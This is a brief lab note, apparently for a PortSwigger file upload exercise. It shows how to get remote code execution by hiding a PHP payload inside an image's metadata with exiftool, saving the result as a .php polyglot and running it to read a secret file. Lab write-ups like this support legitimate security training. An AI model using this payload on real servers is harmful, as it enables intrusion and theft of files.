# Remote code execution via polyglot web shell upload

Source: Portswigger
Tools: Burpsuite
Technique: FIle upload
Fields: Web
Notes: polyglot file

- Use exiftool to add code php into Comment part of a png/jpg file with command:

```java
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

- Then execute it